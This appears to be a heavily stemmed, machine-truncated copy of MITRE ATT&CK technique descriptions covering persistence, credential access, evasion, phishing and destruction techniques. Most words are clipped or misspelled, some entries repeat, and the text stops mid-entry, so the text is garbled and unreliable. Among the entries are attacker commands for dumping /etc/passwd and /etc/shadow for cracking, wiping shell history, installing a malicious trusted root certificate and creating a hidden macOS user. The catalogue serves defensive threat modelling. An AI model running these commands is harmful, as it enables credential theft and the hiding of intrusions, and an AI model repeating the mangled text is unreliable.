advers tak adv rout scheme cont delivery network cdns serv host multipl domain obfusc intend destin http traff traff tunnel http fifield block resist commun domain front 2015 domain front involv us diff domain nam sni field tl head host field http head domain serv cdn cdn rout address spec http head unwrap tl head vary techn domainless front util sni field leav blank allow front work ev cdn attempt valid sni http host field match blank sni field ign exampl domain-x domain-y custom cdn poss plac domain-x tl head domain-y http head traff appear go domain-x howev cdn rout domain-y
arp cach poison
advers poison address resolv protocol arp cach posit commun two network dev act us en follow-on behavy network sniff http transmit dat manip http arp protocol us resolv ipv4 address link lay address med access control mac address rfc826 arp dev loc network seg commun us link lay address network dev link lay address particul network dev send broadcast arp request loc network transl ip address mac address dev assocy ip address direct reply mac address network dev mak arp request us wel stor inform arp cach advers pass wait arp request poison arp cach request dev advers reply mac address thu deceiv victim mak believ commun intend network dev advers poison arp cach reply must fast on mak legitim ip address own advers also send gratuit arp reply malicy annount own particul ip address dev loc network seg arp protocol stateless requir auth theref dev wrong ad upd mac address ip address arp cach san arp spoof aug 2003 cyl cleav advers us arp cach poison mean interceiv network traff act us collect and/or relay dat cred espec send insec unencrypt protocol san arp spoof aug 2003
dis cloud log
advers dis cloud log cap integr limit dat collect act avoid detect cloud environ allow collect analys audit apply log provid insight act us within environ advers sufficy permit dis log avoid detect act exampl aw advers dis cloudwatch/cloudtrail integr pri conduc malicy act follow cloudtrail gen strong aw sec sign sumo log
sec softw discovery
advers attempt get list sec softw config defend tool sens inst system cloud environ includ thing firewal rul anti-virus advers us inform sec softw discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act exampl command us obtain sec softw inform netsh http < cod > reg query < /code > reg http < cod > dir < /code > cmd http taskl http ind discovery behavy spec typ softw sec system advers look becom common see maco malw perform check littlesnitch knockknock softw advers also util cloud ap discov config firewal rul within environ expel io evil aw exampl permit ip rang port us account inbound/outbound rul sec group virt firewal est within aw ec2 and/or vpc inst rev < cod > describesecuritygroup < /code > act vary request paramet describesecuritygroup - amazon elast comput cloud
hid window
advers us hid window cont malicy act plain sight us cas window would typ display apply carry op hid util system admin avoid disrupt us work environ carry admin task window vary feat script langu window powershel http jscript vis bas http mak window hid on exampl < cod > powershell.exe -windowstyle hid < /code > powershel 2019 simil maco config apply run list property list plist fil on tag fil < cod > apple.awt.uielement < /code > allow jav apply prev apply icon appear dock common us apply run system tray n't also want show dock advers abus funct hid otherw vis window us alert us advers act system ant mac malw
transmit dat manip
advers alt dat en rout stor system ord manip extern outcom hid act fireey apt38 oct 2018 doj lazar sony 2018 manip transmit dat advers attempt affect busy process org understand decid mak manip poss network connect system process opportun deploy tool interceiv chang inform typ mod impact depend target transmit mech wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
python
advers abus python command script execut python popul scripting/programming langu cap perform many funct python execut interact command-line via < cod > python.exe < /code > interpret via script .py writ distribut diff system python cod also compil bin execut python com many built-in pack interact und system fil op dev i/o advers us libr download execut command script wel perform vary malicy behavy
ident rol
advers gath inform id rol within victim org us target inform busy rol rev vary target detail includ ident inform key personnel wel data/resources access advers gath inform vary way direct elicit via phish inform http inform busy rol also expos advers via onlin access dat set ex soc med http search victim-owned websit http threatpost broadvo leak gath inform rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex est account http comprom account http and/or init access ex phish http
dat encod
advers encod dat mak cont command control traff difficult detect command control c2 inform encod us standard dat encod system us dat encod adh ex protocol spec includ us asci unicod base64 mim binary-to-text charact encod system wikiped binary-to-text encod wikiped charact encod dat encod system also result dat compress gzip
appinit dlls
advers est persist and/or elev privileg execut malicy cont trig appinit dlls load process dynamic-link libr dlls spec < cod > appinit_dlls < /code > valu reg key < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\windows < /code > < cod > hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows < /code > load user32.dll every process load user32.dll pract near every program sint user32.dll common libr elast process inject july 2017 simil process inject valu abus obtain elev privileg caus malicy dll load run context sep process comput appinit reg malicy appinit dlls also provid persist continu trig ap act appinit dll funct dis window 8 lat vert sec boot en appinit sec boot
phish inform
advers send phish mess elicit sensit inform us target phish inform attempt trick target divulg inform frequ cred act inform phish inform diff phish http object gath dat victim rath execut malicy cod form phish electron del soc engin phish target know spearph spearph spec individ company industry target advers gen advers conduc non-targeted phish mass cred harvest campaign advers also try obtain inform direct exchang email inst mess electron convers mean threatpost soc med phish trendmictro phish pcmag fakelogin sopho attach github phishery phish inform frequ involv soc engin techn pos sourc reason collect inform ex est account http comprom account http and/or send multipl seem urg mess
resourc hijack
advers lev resourc co-opted system ord solv resourc intend problem impact system and/or host serv avail on common purpos resourc hijack valid transact cryptocur network earn virt cur advers consum enough system resourc neg impact and/or caus affect machin becom unrespond kaspersky lazar hood blog 2017 serv cloud-bas system common target high pot avail resourc us endpoint system also comprom us resourc hijack cryptocur min cloudsploit - unus aw reg contain environ also target due eas deploy via expos ap pot scal min act deploy comprom multipl contain within environ clust unit 42 hildegard malw trend micro expos dock ap addit cryptocur min malw ident kil process compet malw ens ’ compet resourc trend micro war crypto min advers also us malw lev system network bandwid part botnet ord facilit network den serv http campaign and/or see malicy tor gobotkr
est account
advers cre cult account serv us target advers cre account us build person op person develop consist develop publ inform pres hist appropry affy develop could apply soc med websit publ avail inform could ref scrutinize legitim cours op us person id newscaster2014 blackhatrobins op incorp soc engin util onlin person import person fict imperson real peopl person ex singl sit across multipl sit ex facebook linkedin twit googl github dock hub etc. est person requir develop addit docu mak seem real could includ fil profil inform develop soc network incorp photo newscaster2014 blackhatrobins est account also includ cre account email provid direct lev phish inform http phish http mandy apt1
obtain cap
advers buy and/or ste cap us target rath develop cap in-house advers purchas fre download ste act includ acquisit malw softw includ licens exploit cert inform rel vuln advers obtain cap support op throughout num phas advers lifecyc addit download fre malw softw exploit internet advers purchas cap third-party ent third-party ent includ technolog company spec malw exploit crimin marketplac individ nationsbuy pegasuscitizenlab addit purchas cap advers ste cap third-party ent includ advers includ ste softw licens malw ssl/tls code-signing cert raid clos databas vuln exploit diginotarcomprom
screensaver
advers est persist execut malicy cont trig us inact screensavers program execut config tim us inact consist port execut pe fil .scr fil extend wikiped screensaver window screensaver apply scrnsave.scr loc < cod > c \windows\system32\ < /code > < cod > c \windows\syswow64\ < /code > 64-bit window system along screensavers includ bas window instal follow screensaver set stor reg < cod > hkcu\control panel\desktop\ < /code > could manip achiev persist < cod > scrnsave.exe < /code > - set malicy pe path < cod > screensaveactive < /code > - set ' 1 ' en screensaver < cod > screensaverissecure < /code > - set ' 0 ' requir password unlock < cod > screensavetimeout < /code > - set us inact timeout screensaver execut advers us screensaver set maintain persist set screensaver run malw certain timefram us inact eset gaz aug 2017
hid us
every us account maco userid assocy cre us spec userid account property valu < cod > /library/preferences/com.apple.loginwindow < /code > cal < cod > hide500users < /code > prev us userid 500 low appear login screen us cre account http techn userid 500 en property set ye advers hid us account much easy < cod > sudo dscl -create /users/username uniqueid 401 < /code > cybereason osx pirrit
cre cloud inst
advers cre new inst virt machin vm within comput serv cloud account evad defens cre new inst allow advers bypass firewal rul permit ex inst cur resid within account advers cre snapshot http on volum account cre new inst mount snapshot apply le restrict sec policy collect dat loc system http remot dat stag http mandy m-trends 2020 cre new inst also allow advers carry malicy act within environ without affect execut cur run inst
compil delivery
advers attempt mak payload difficult discov analys del fil victim uncompil cod simil obfusc fil inform http text-based sourc cod fil subvert analys scrutiny protect target executables/binary payload nee compil execut typ via nat util csc.exe gcc/mingw clearsky muddyw nov 2018 sourc cod payload also encrypt encod and/or emb within fil del spearph attach http payload also del form unrecogn inh benign nat o ex ex macos/linux lat compil prop execut bin bundl compil execut framework trendmicro windowsappmac
cod reposit
advers lev cod reposit collect valu inform cod reposit tools/service stor sourc cod autom softw build host intern priv third party sit github gitlab sourceforg bitbucket us typ interact cod reposit web apply command-line util git advers gain access victim network priv cod reposit collect sensit inform propriet sourc cod cred contain within softw sourc cod access softw sourc cod allow advers develop exploit http cred provid access addit resourc us valid account http wir ub breach kreb adob not distinct cod reposit http foc conduc reconnaiss http via publ cod reposit
transmit dat manip
advers alt dat en rout stor system ord manip extern outcom hid act thu threaten integr dat fireey apt38 oct 2018 doj lazar sony 2018 manip transmit dat advers attempt affect busy process org understand decid mak manip poss network connect system process opportun deploy tool interceiv chang inform typ mod impact depend target transmit mech wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
/etc/passwd /etc/shadow
advers attempt dump cont < cod > /etc/passwd < /code > < cod > /etc/shadow < /code > en offlin password crack modern linux op system us combin < cod > /etc/passwd < /code > < cod > /etc/shadow < /code > stor us account inform includ password hash < cod > /etc/shadow < /code > default < cod > /etc/shadow < /code > read root us linux password shadow fil form linux util unshadow us combin two fil form suit password crack util john rip nixcraft - john rip < cod > /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db < /code >
launch ag
advers cre mod launch ag rep execut malicy payload part persist us log per-us launchd process start load paramet launch-on-demand us ag property list .plist fil find < cod > /system/library/launchagents < /code > < cod > /library/launchagents < /code > < cod > ~/library/launchagents < /code > appledoc launch ag daemon osx keydnap malw ant mac malw property list fil us < cod > label < /code > < cod > programargu < /code > < cod > runatload < /code > key ident launch ag nam execut loc execut tim osx.dok malw launch ag oft inst perform upd program launch us spec program login conduc develop task launch ag also execut us launchctl http command advers instal new launch ag execut login plac .plist fil appropry fold < cod > runatload < /code > < cod > keep < /code > key set < cod > tru < /code > sof komplex trod method mac malw persist launch ag nam disgu us nam rel op system benign softw launch ag cre us level privileg execut us level permit osx malw detect oceanlot o x
system serv
advers abus system serv daemon execut command program advers execut malicy cont interact cre serv eith loc remot many serv set run boot aid achiev persist cre mod system process http advers also abus serv one-tim temp execut
window command shel
advers abus window command shel execut window command shel cmd http prim command prompt window system window command prompt us control almost aspect system vary permit level requir diff subset command command prompt invok remot via remot serv http ssh http ssh window batch fil ex .bat .cmd also provid shel list sequ command run wel norm script op condit loop common us batch fil includ long repetit task nee run set command multipl system advers lev cmd http execut vary command payload common us includ cmd http execut singl command abus cmd http interact input output forward command control channel
proc mem
advers inject malicy cod process via /proc filesystem ord evad process-based defens wel poss elev privileg proc mem inject method execut arbit cod address spac sep liv process proc mem inject involv enum mem process via /proc filesystem < cod > /proc/ pid < /code > craft return-oriented program rop payload avail gadgets/instruction run process direct includ mem map proc mem inject common perform overwrit target process ’ stack us mem map provid /proc filesystem inform us enum offset includ stack gadget instruct within program us build malicy payload otherw hid process mem protect address spac layout random aslr enum target process ’ mem map within < cod > /proc/ pid /maps < /code > overwrit us dd uninform needl gd linux inject dd man techn dynam link hijack http us pop target process avail gadget simil process hollow http proc mem inject target child process background cop sleep gd linux inject run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via proc mem inject also evad detect sec produc sint execut mask legitim process
compil html fil
compil html fil .chm common distribut part microsoft html help system chm fil compress compil vary cont html docu im scripting/web rel program langu vba jscript jav activex microsoft html help 2018 chm cont display us und compon internet expl brows microsoft html help activex load html help execut program hh.exe microsoft html help execut program advers abus technolog cont malicy cod custom chm fil contain emb payload could del victim trig us execut http chm execut also bypass apply whitel old and/or unpatch system account execut bin hh.exe msitpro chm aug 2017 microsoft cve-2017-8625 aug 2017
patch system im
advers mod op system network dev introduc new cap weak ex defens kil myth cisco io rootkit kil io divers myth cisco io shellcod cisco io forens develop junip netscreen dead network dev build monolith architect entir op system funct dev contain within singl fil advers chang fil stor load fut boot mem runtim chang op system stor advers typ us standard proc avail dev op involv download new fil via typ protocol us network dev tftp ftp scp consol connect origin fil overwrit new fil writ alongsid dev reconfig boot comprom im chang op system mem advers typ us on two method first advers would mak us nat debug command origin unalt run op system allow direct mod relev mem address contain run op system method typ requir admin level access dev second method chang op system mem advers would mak us boot load boot load first piec softw load dev start turn launch op system advers us malicy cod prevy impl boot load rommonkit http method direct manip run op system cod mem malicy cod bootload provid cap direct mem manip advers allow patch liv op system runtim mod instruct stor system im fil advers eith weak ex defens provid new cap dev exampl ex defens imp includ encrypt via weak encrypt http auth via network dev auth http perimet defens via network bound bridg http ad new cap advers ’ purpos includ keylog http multi-hop proxy http port knock http advers also comprom ex command op system produc fals output mislead defend method us conjunct downgrad system im http on exampl comprom system command includ chang output command show vert cur run op system patch op system advers chang command instead display origin high revid numb replac system downgrad op system patch stor achiev eith resid stor typ form flash mem non-volatile via tftp boot http techn perform run op system mem stor cop techn surv across reboot howev liv mem mod op system combin rommonkit http achiev persist
silv ticket
advers password hash target serv account e.g sharepoint mssql forg kerbero ticket grant serv tgs ticket also know silv ticket kerbero tgs ticket also know serv ticket adsec silv ticket silv ticket limit scop gold ticket en advers access particul resourc e.g mssql system host resourc howev unlik gold ticket advers abl forg silv ticket abl cre tgs ticket without interact key distribut cent kdc pot mak detect difficult adsec detect forg ticket password hash target serv obtain us o cred dump http kerberoast http
dat inform reposit
advers lev inform reposit min valu inform inform reposit tool allow stor inform typ facilit collab inform shar us stor wid vary dat aid advers object direct access target inform advers also abus extern shar feat shar sensit docu recipy outsid org follow brief list exampl inform hold pot valu advers also find inform reposit policy proc standard phys / log network diagram system architect diagram techn system docu test / develop cred work / project schedule sourc cod snippet link network shar intern resourc inform stor reposit vary bas spec inst environ spec common inform reposit includ web-based platform sharepoint http conflu http spec serv cod reposit ia databas enterpr databas stor infrastruct sql serv
clear persist
advers clear artifact assocy prevy est persist host system remov evid act involv vary act remov serv delet execut mod reg http plist fil mod http method cleanup prev defend collect evid persist pres cyl dust storm inst artifact persist also remov advers ’ persist execut ord prev er new inst malw ncc group team9 jun 2020
clear command hist
addit clear system log advers clear command hist comprom account cont act undertak intrud maco linux keep track command us typ termin us retrac 've do log access diff way log command hist track fil point environ vary < cod > histfil < /code > us log system inform flush fil us hom direct cal < cod > ~/.bash_history < /code > benefit allow us go back command 've us diff sess sint everyth typ command-line sav password pass command lin also sav advers abus search fil cleartext password addit advers us vary method prev command appear log < cod > unset histfil < /code > < cod > export histfilesize=0 < /code > < cod > hist -c < /code > < cod > rm ~/.bash_history < /code >
window cred man
advers acquir cred window cred man cred man stor cred sign websit apply and/or dev request auth ntlm kerbero cred lock prevy know window vault microsoft cred man stor microsoft cred lock window cred man sep websit cred apply network cred two lock part cred web brows http internet expl microsoft edg websit cred man cred man stor web cred lock apply network cred stor window cred lock cred lock stor cred encrypt ` .vcrd ` fil loc ` systemdr \users\\ usernam \appdata\local\microsoft\\ vault/credentials \ ` encrypt key find fil nam < cod > policy.vpol < /code > typ loc fold cred passcap window vault malwarebyt window vault advers list cred man window cred man sev mech < cod > vaultcmd.exe < /code > nat window execut us enum cred stor cred lock command-line interfac advers also gath cred direct read fil loc insid cred lock window ap < cod > credenumerate < /code > also absu list cred man cred man microsoft credenum delpy mimikatz crend man advers also obtain cred cred backup cred backup rest perform run < cod > rundll32.exe keymgr.dll krshowkeymgr < /code > select “ back ... ” button “ stor us nam password ” gui password recovery tool also obtain plain text password cred man malwarebyt window vault
emond
advers us ev monit daemon emond est persist schedule malicy command run predict ev trig emond launch daemon http acceiv ev vary serv run simpl rul engin tak act emond bin < cod > /sbin/emond < /code > load rul < cod > /etc/emond.d/rules/ < /code > direct tak act explicit defin ev tak plac rul fil plist form defin nam ev typ act tak exampl ev typ includ system startup us auth exampl act run system command send email emond serv launch fil pres queuedirect path < cod > /private/var/db/emondclients < /code > spec launch daemon http config fil < cod > /system/library/launchdaemons/com.apple.emond.plist < /code > xorry emond jan 2018 magnusvir emond apr 2016 sentinelon maco persist jun 2019 advers abus serv writ rul execut command defin ev occ system start us auth xorry emond jan 2018 magnusvir emond apr 2016 sentinelon maco persist jun 2019 advers also abl esc privileg admin root emond serv execut root privileg launch daemon http serv
spearph via serv
spearph via serv spec vary spearph diff form spearph employ us third party serv rath direct via enterpr email channel form spearph electron del soc engin target spec individ company industry scenario advers send mess vary soc med serv person webmail non-enterprise control serv serv lik less-strict sec policy enterpr kind spearph goal gen rapport target get target interest way advers cre fak soc med account mess employ pot job opportun allow plaus reason ask serv policy softw run environ advers send malicy link attach serv common exampl build rapport target via soc med send cont person webmail serv target us work comput allow advers bypass email restrict work account target lik op fil sint someth expect payload n't work expect advers continu norm commun troubleshoot target get work
hardw addit
advers introduc comput access network hardw comput dev system network us vect gain access rath connect distribut payload via remov stor i.e reply remov med http robust hardw addit us introduc new funct and/or feat system abus publ ref us threat act scarc many red teams/penetration test lev hardw addit init access commerc op sourc produc lev cap pass network tap network traff mod i.e adversary-in-the-middle http keystrok inject kernel mem read via dma addit new wireless access ex network oth ossman star feb 2011 alek weapon nov 2015 frisk dma august 2016 mcmillan pwn march 2012
serv softw compon
advers abus legitim extens develop feat serv est persist access system enterpr serv apply includ feat allow develop writ instal softw script extend funct main apply advers instal malicy compon extend abus serv apply volexity_0day_sophos_fw
dat destruct
advers destroy dat fil spec system larg numb network interrupt avail system serv network resourc dat destruct lik rend stor dat irrecov forens techn overwrit fil dat loc remot driv symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017 unit 42 shamoon3 2018 talo olymp destroy 2018 common op system fil delet command < cod > del < /code > < cod > rm < /code > oft remov point fil without wip cont fil mak fil recov prop forens methodolog behavy distinct disk cont wip http disk structure wip http individ fil destroy rath sect stor disk disk log structure advers attempt overwrit fil direct random gen dat mak irrecov kaspersky stonedril 2017 unit 42 shamoon3 2018 cas polit ory im fil us overwrit dat fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017 maxim impact target org op network-wide avail interrupt goal malw design destroy dat worm-like feat prop across network lev addit techn lik valid account http o cred dump http smb/windows admin shar http symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017 talo olymp destroy 2018 cloud environ advers lev access delet cloud stor cloud stor account machin im infrastruct cruc op dam org custom dat destruct - threat post doj - cisco insid
non-standard encod
advers encod dat non-standard dat encod system mak cont command control traff difficult detect command control c2 inform encod us non-standard dat encod system diverg ex protocol spec non-standard dat encod scheme bas rel standard dat encod scheme mod base64 encod mess body http request wikiped binary-to-text encod wikiped charact encod
domain control auth
advers patch auth process domain control bypass typ auth mech en access account malw us inject fals cred auth process domain control int cre backdo us access us ’ account and/or cred ex skeleton key http skeleton key work patch enterpr domain control auth process lsass cred advers us bypass standard auth system patch advers us inject password success auth domain us account skeleton key eras mem reboot domain control auth access en unfet access host and/or resourc within single-factor auth environ del skeleton
transf dat cloud account
advers exfilt dat transf dat includ backup cloud environ anoth cloud account control serv avoid typ fil transfers/download network-based exfilt detect defend monit larg transf outsid cloud environ norm fil transf command control channel watch dat transf anoth account within cloud provid transf util ex cloud provid ap intern address spac cloud provid blend norm traff avoid dat transf extern network interfac incid observ advers cre backup cloud inst transf sep account doj gru indict jul 2018
html smuggl
advers smuggl dat fil past cont filt hid malicy payload insid seem benign html fil html docu stor larg bin object know javascrib blob immut dat repres raw byt lat construct file-lik object dat also stor dat url en emb med typ mim fil inlin html docu html5 also introduc download attribut us in fil download html smuggl menlo sec 2020 outlflank html smuggl 2018 advers del payload victim bypass sec control html smuggl abus javascrib blob and/or html5 download attribut sec control web cont filt ident smuggl malicy fil insid html/js fil cont bas typ benign mim typ < cod > text/plain < /code > and/or < cod > text/html < /code > malicy fil dat obfusc hid insid html fil dat url and/or javascrib blob deobfusc reach victim i.e deobfuscate/decod fil inform http pot bypass cont filt exampl javascrib blob abus dynam gen malicy fil victim machin drop disk abus javascrib funct < cod > mssaveblob < /code > html smuggl menlo sec 2020 mstic nobel 2021 outlflank html smuggl 2018 nccgroup smuggl hta 2017
revers encrypt
advers abus act direct auth encrypt property gain access cred window system < cod > allowreversiblepasswordencrypt < /code > property spec wheth revers password encrypt account en dis default property dis instead stor us cred output one-way hash funct en unless leg softw requir store_pwd_rev_enc property en and/or us chang password en advers abl obtain plaintext password created/chang property en decrypt password advers nee four compon 1. encrypt password < cod > g radiuschap < /code > act direct user-structure < cod > userparamet < /code > 2 16 byt randomly-generated valu < cod > g radiuschapkey < /code > also < cod > userparamet < /code > 3. glob lsa secret < cod > g msradiuschapkey < /code > 4. stat key hardcod remot access subauth dll < cod > rassfm.dll < /code > inform advers abl reproduc encrypt key subsequ decrypt encrypt password valu how_pwd_rev_enc_1 how_pwd_rev_enc_2 advers set property vary scop loc group policy edit us property fine-grained password policy fgpp via activedirect powershel http mod exampl advers impl apply fgpp us group domain funct level set window serv 2008 high dump_pwd_dcsync powershel advers mak assocy chang us set us command simil < cod > set-aduser -allowreversiblepasswordencryption tru < /code >
instal root cert
root cert us publ key cryptograph ident root cert auth ca root cert inst system apply trust cert root chain trust sign root cert wikiped root cert cert common us est sec tls/ssl commun within web brows us attempt brows websit pres cert trust er mess display warn us sec risk depend sec set brows allow us est connect websit instal root cert comprom system would giv advers way degrad sec system advers us techn avoid sec warn prompt us comprom system connect http advers control web serv spoof legitim websit ord collect login cred op em atyp root cert also pre-installed system manufact softw supply chain us conjunct malware/adwar provid man-in-the-middle cap interceiv inform transmit sec tls/ssl commun kaspersky superf root cert assocy chain also clon reinstal clon cert chain carry many metadat charact sourc us sign malicy cod bypass sign valid tool ex sysintern antivir etc us block execut and/or uncov artifact persist spectorop cod sign dec 2017 maco ay mam malw us < cod > /usr/bin/security add-trusted-cert -d -r trustroot -k /library/keychains/system.keychain /path/to/malicious/cert < /code > instal malicy cert trust root cert system keychain objective-s ay mam 2018
dat encrypt
dat encrypt exfilt ord hid inform exfilt detect mak exfilt le conspicu upon inspect defend encrypt perform util program libr custom algorithm dat consid sep encrypt perform command control fil transf protocol common fil arch form encrypt fil rar zip exfilt techn lik apply wel transf inform network exfilt c2 channel http exfilt altern protocol http
fil delet
advers delet fil leav behind act intrud act malw tool non-native fil drop cre system advers ex ingr tool transf http leav trac ind do within network remov fil occ intrud part post-intrusion process minim advers footprint tool avail host op system perform cleanup advers us tool wel microsoft sdelet july 2016 exampl built-in command script interpret http funct includ < cod > del < /code > window < cod > rm < /code > < cod > unlink < /code > linux maco
drive-by comprom
advers gain access system us visit websit norm cours brows techn us web brows typ target exploit advers also us comprom websit non-exploitat behavy acquir apply access tok http multipl way del exploit cod brows ex includ legitim websit comprom advers inject form malicy cod javascrib ifram cross-site script malicy ad pay serv legitim ad provid built-in web apply interfac lev insert kind object us display web cont contain script execut visit cli e.g for post com us control web cont oft websit us advers on visit spec commun govern particul industry reg goal comprom spec us set us bas shar interest kind target campaign oft ref strategic web comprom wat hol attack sev know exampl occ shadowserv strategic web comprom typ drive-by comprom process 1. us visit websit us host advers control cont 2. script autom execut typ search vert brows plugin pot vuln vert us requir assist process en script act websit compon ign warn dialog box 3. upon find vuln vert exploit cod del brows 4. exploit success giv advers cod execut us system unless protect plac cas second visit websit init scan requir exploit cod del unlik exploit public-facing apply http foc techn exploit softw cli endpoint upon visit websit common giv advers access system intern network instead extern system dmz advers also us comprom websit del us malicy apply design ste apply access tok http lik oau tok gain access protect apply inform malicy apply del popup legitim websit volex oceanlot nov 2017
network den serv
advers perform network den serv do attack degrad block avail target resourc us network do perform exhaust network bandwid serv rely exampl resourc includ spec websit email serv dns web-based apply advers observ conduc network do attack polit purpos fireey oppoisonedhandov febru 2016 support malicy act includ distract fsisac fraudnetdo septemb 2012 hackt extort symantec ddo octob 2014 network do occ bandwid capac network connect system exhaust due volum malicy traff direct resourc network connect network dev resourc rely exampl advers send 10gbps traff serv host network 1gbps connect internet traff gen singl system multipl system spread across internet common ref distribut do ddo perform network do attack sev aspect apply multipl method includ ip address spoof botnet advers us origin ip address attack system spoof sourc ip address mak attack traff difficult trac back attack system en reflect increas difficul defend defend attack reduc elimin effect filt sourc address network defens dev do attack target host system direct see endpoint den serv http
instal pack
advers est persist elev privileg us instal trig execut malicy cont instal pack o spec contain resourc op system nee instal apply system instal pack includ script run pri instal wel instal complet instal script inherit elev permit execut develop oft us script prep environ instal check requir download depend remov fil instal instal pack script rich trouton us legitim apply advers distribut apply mod instal script execut malicy cont us instal apply requir grant admin permit allow instal end instal process legitim apply cont maco ` postinstal ` script execut inherit elev permit advers us script execut malicy execut instal malicy compon launch daemon http elev permit apply bundl manip brandon dalton wardl evilquest part depend distribut linux vert pack instal script sometim cal maintain script post instal script script includ ` preinst ` ` postinst ` ` prerm ` ` postrm ` script run root execut window microsoft instal serv us ` .msi ` fil man inst upd uninstal apply advers lev ` prebuild ` ` postbuild ` ev run command build inst .msi fil window appleje gre deb man maintain script
scan ip block
advers scan victim ip block gath inform us target publ ip address alloc org block rang sequ address advers scan ip block ord gath victim network inform http ip address act us wel detail inform host assign address scan rang simpl ping icmp request respons nuant scan rev host software/versions via serv ban network artifact botnet scan inform scan rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http
hid fil direct
prev norm us accid chang spec fil system op system conceiv ‘ hid ’ fil fil ’ show us brows fil system gui us norm command command lin us must explicit ask show hid fil eith via sery graph us interfac gui prompt command lin switch < cod > dir /a < /code > window < cod > l –a < /code > linux maco advers us adv hid fil fold anywh system persist evad typ us system analys incorp investig hid fil window us mark spec fil hid us attrib.exe bin simply < cod > attrib +h filenam < /code > mark fil fold hid simil “ +s ” mark fil system fil “ +r ” flag mark fil read lik window bin attrib.exe bin provid abl apply chang recurs “ /s ” linux/mac us mark spec fil hid simply put “ ” first charact fil fold nam sof komplex trod ant mac malw fil fold start period ‘ ’ default hid view find apply standard command-line util lik “ l ” us must spec chang set fil view command lin us typ flag see fil includ hid on view fil find apply follow command must execut < cod > default writ com.apple.finder appleshowallfil ye < /code > relaunch find apply mac fil maco mark uf_hidden flag prev see finder.app stil allow see terminal.app wirelurk many apply cre hid fil fold stor inform ’ clut us ’ workspac exampl ssh util cre .ssh fold ’ hid contain us ’ know host key
templ inject
advers cre mod ref us docu templ cont malicy cod forc auth attempt exampl microsoft ’ off op xml ooxml spec defin xml-based form off docu .docx xlsx .pptx replac old bin form .doc .xls .ppt ooxml fil pack togeth zip arch comprom vary xml fil ref part contain property collect defin docu rend microsoft op xml july 2017 property within part ref shar publ resourc access via onlin url exampl templ property ref fil serv pre-formatted docu blueprint fetch docu load advers abus templ init cont malicy cod execut via us docu templ ref inject docu en malicy payload fetch execut docu load san bri wilts templ inject docu del via techn phish http and/or taint shar cont http evad stat detect sint typ ind vba macro script etc pres malicy payload fetch redxorblu remot templ inject exampl see wild templ inject us load malicy cod contain exploit malwarebyt templ inject oct 2017 advers also mod < cod > \template < /code > control word within .rtf fil simil cont download malicy cod legitim control word valu intend fil destin templ fil resourc retriev load .rtf fil op howev advers alt byt ex .rtf fil insert templ control word field includ url resourc malicy payload proofpoint rtf inject ciberseguridad decod malicy rtf fil techn also en forc auth http inject smb/https cred prompt url trig auth attempt anomal templ inject mar 2018 talo templ inject july 2017 ryhanson phishery sept 2016
rc script
advers est persist mod rc script execut unix-like system ’ startup fil allow system admin map start custom serv startup diff run level rc script requir root privileg mod advers est persist ad malicy bin path shel command < cod > rc.local < /code > < cod > rc.common < /code > rc script spec unix-like distribut iranthr kit dec 2017 intez hiddenwasp map 2019 upon reboot system execut script cont root result persist advers abus rc script espec effect lightweight unix-like distribut us root us default iot emb system intezer-kaiji-malware sev unix-like system mov systemd deprec us rc script deprec mech maco fav launchd http appl develop doco arch launchd startup item techn us mac o x panth v10.3 ear vert stil execut rc script method mac malw persist maintain backward compat system ubuntu execut rc script ex correct fil permit ubuntu manp systemd rc
access tok manip
advers mod access tok op diff us system sec context perform act bypass access control window us access tok determin own run process us manip access tok mak run process appear though child diff process belong someon us start process occ process also tak sec context assocy new tok advers us built-in window ap funct cop access tok ex process know tok ste tok apply ex process i.e tok impersonation/theft http us spawn new process i.e cre process tok http advers must already privileg us context i.e admin ste tok howev advers common us tok ste elev sec context admin level system level advers us tok auth remot system account tok account appropry permit remot system pentestlab tok manip standard us us < cod > runa < /code > command window ap funct cre imperson tok requir access admin account also mech act direct field us mod access tok
tim provid
window tim serv w32time en tim synchron across within domain microsoft w32time feb 2018 w32time tim provid respons retriev tim stamp hardware/network resourc output valu network cli microsoft timeprovid tim provid impl dynamic-link libr dlls reg subkey < cod > hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\ < /code > microsoft timeprovid tim provid man direct serv control man load start tim provid list en key system startup and/or whenev paramet chang microsoft timeprovid advers abus architect est persist spec reg en malicy dll tim provid admin privileg requir tim provid reg though execut run context loc serv account github w32time oct 2017
multi-factor auth interceiv
advers target multi-factor auth mfa mech i.e. smart card tok gen etc gain access cred us access system serv network resourc us mfa recommend provid high level sec us nam password alon org aw techn could us interceiv bypass sec mech smart card us multi-factor auth keylog nee us obtain password assocy smart card norm us insert card access smart card password advers connect network resourc us infect system proxy auth insert hardw tok mandy trend 2011 advers also employ keylog simil target hardw tok rsa securid capt tok input includ us person id cod provid temp access i.e replay one-tim passcod next valu rollov wel poss en advers rely predict fut auth valu giv access algorithm see valu us gen append temp cod gcn rsa jun 2011 method mfa interceiv us advers auth common one-tim cod send via out-of-band commun email sm dev and/or serv sec vuln interceiv although prim foc cyb crimin auth mech target adv act op em
launch ag
per appl ’ develop docu us log per-us launchd process start load paramet launch-on-demand us ag property list plist fil find < cod > /system/library/launchagents < /code > < cod > /library/launchagents < /code > < cod > home/library/launchagents < /code > appledoc launch ag daemon osx keydnap malw ant mac malw launch ag property list fil point execut launch osx.dok malw advers instal new launch ag config execut login us launchd launchctl load plist appropry direct sof komplex trod method mac malw persist ag nam disgu us nam rel op system benign softw launch ag cre us level privileg execut privileg us log osx malw detect oceanlot o x set execut spec us log spec us ’ direct structure us log requir admin privileg
softw pack
